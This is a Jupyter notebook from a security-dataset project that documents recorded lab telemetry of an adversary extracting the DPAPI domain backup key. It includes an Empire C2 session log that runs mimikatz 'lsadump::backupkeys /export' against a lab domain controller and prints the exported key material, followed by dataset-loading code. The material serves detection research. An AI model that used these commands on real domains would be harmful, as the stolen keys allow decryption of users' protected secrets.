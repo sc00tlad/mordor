{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "a962b4b6",
   "metadata": {},
   "source": [
    "# Empire Mimikatz Backup Keys"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "282e86b9",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "50116e7f",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/05/18 |\n",
    "| Modification Date | 2020/09/21 |\n",
    "| Tactics           | [TA0006](https://attack.mitre.org/tactics/TA0006) |\n",
    "| Techniques        | [T1003](https://attack.mitre.org/techniques/T1003) |\n",
    "| Tags              | DPAPI,DPAPI Domain Backup key,RPC LSARPC |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9600d3b8",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries retrieving the DPAPI Domain Backup Key from the DC via RPC LSARPC methods over SMB."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bcedc051",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8f0e9898",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_mimikatz_backupkeys_dcerpc_smb_lsarpc.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_mimikatz_backupkeys_dcerpc_smb_lsarpc.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/network/empire_mimikatz_backupkeys_dcerpc_smb_lsarpc.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/network/empire_mimikatz_backupkeys_dcerpc_smb_lsarpc.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f7bab3aa",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d68e8970",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "14a8b7f8",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [mimikatz_lsadump_backupkeys](https://github.com/OTRF/Blacksmith/blob/master/aws/Security-Datasets/cfn-files/scripts/Invoke-Mimikatz.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9c891551",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: stager/multi/launcher) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "ALYH6ZB2 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4380   5/0.0    2020-10-22 18:24:28  http            \n",
    "\n",
    "(Empire: agents) > interact ALYH6ZB2\n",
    "(Empire: ALYH6ZB2) > usemodule credentials/mimikatz/\n",
    "cache*           command          dcsync_hashdump  golden_ticket    logonpasswords*  mimitokens*      purge            silver_ticket    \n",
    "certs*           dcsync           extract_tickets  keys*            lsadump*         pth*             sam*             trust_keys*      \n",
    "(Empire: ALYH6ZB2) > usemodule credentials/mimikatz/command\n",
    "(Empire: powershell/credentials/mimikatz/command) > set Command lsadump::backupkeys /system:MORDORDC.theshire.local /export\n",
    "(Empire: powershell/credentials/mimikatz/command) > execute\n",
    "[*] Tasked ALYH6ZB2 to run TASK_CMD_JOB\n",
    "[*] Agent ALYH6ZB2 tasked with task ID 1\n",
    "[*] Tasked agent ALYH6ZB2 to run module powershell/credentials/mimikatz/command\n",
    "(Empire: powershell/credentials/mimikatz/command) > \n",
    "Job started: 75WB4S\n",
    "\n",
    "Hostname: WORKSTATION5.theshire.local / S-1-5-21-2323213074-4052461197-1785501644\n",
    "\n",
    "  .#####.   mimikatz 2.2.0 (x64) #19041 Oct  4 2020 10:28:51\n",
    ".## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n",
    "## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    "## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n",
    "'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    "  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n",
    "\n",
    "mimikatz(powershell) # lsadump::backupkeys /system:MORDORDC.theshire.local /export\n",
    "\n",
    "Current prefered key:       {a0feda20-878f-4e68-ba74-d4df8f0191ab}\n",
    "  * RSA key\n",
    "        |Provider name : Microsoft Strong Cryptographic Provider\n",
    "        |Unique name   : \n",
    "        |Implementation: CRYPT_IMPL_SOFTWARE ; \n",
    "        Algorithm      : CALG_RSA_KEYX\n",
    "        Key size       : 2048 (0x00000800)\n",
    "        Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )\n",
    "        Exportable key : YES\n",
    "        Private export : OK - 'ntds_capi_0_a0feda20-878f-4e68-ba74-d4df8f0191ab.keyx.rsa.pvk'\n",
    "        PFX container  : OK - 'ntds_capi_0_a0feda20-878f-4e68-ba74-d4df8f0191ab.pfx'\n",
    "        Export         : OK - 'ntds_capi_0_a0feda20-878f-4e68-ba74-d4df8f0191ab.der'\n",
    "\n",
    "Compatibility prefered key: {0343c16b-26f1-4e2c-83ed-90e443b3bfca}\n",
    "  * Legacy key\n",
    "daef8bf857ba653c7c233a1156d0fb3c488487caf7b0cb1879f6f6fd4dc3877d\n",
    "4ad77077efd018b07267585828f1e3a7e88abd203ca86d820bcd1f1f806426e2\n",
    "71834ddd67073b1e581379be55a6dd97fecee5ff9cda881936209f35653a681e\n",
    "444aedb87d2bef790e4b25084c4395372f358e226893731f621eb3f0f99153ab\n",
    "9af4c25dd32010ffe1bcac8b7ba10c6163d97b85ee19653356624068b8f01476\n",
    "77cb393bbf0fd4369a8a6982545aa2a81b70132b636218bdb9a7b7f7149d361c\n",
    "45236e528672ec9defd57430cdc0264ad6d51669715d83be2b059ec162607603\n",
    "834960f44601d4a2a02d901d67f7046b81adf702b48f8420598dd8e81fe8b1bc\n",
    "\n",
    "        Export         : OK - 'ntds_legacy_0_0343c16b-26f1-4e2c-83ed-90e443b3bfca.key'\n",
    "(Empire: powershell/credentials/mimikatz/command) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8b13fc3a",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dbb5332e",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "74a7a279",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_mimikatz_backupkeys_dcerpc_smb_lsarpc.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3cc8fe37",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7d16472d",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9169561a",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5fb6a171",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7c6a29a6",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
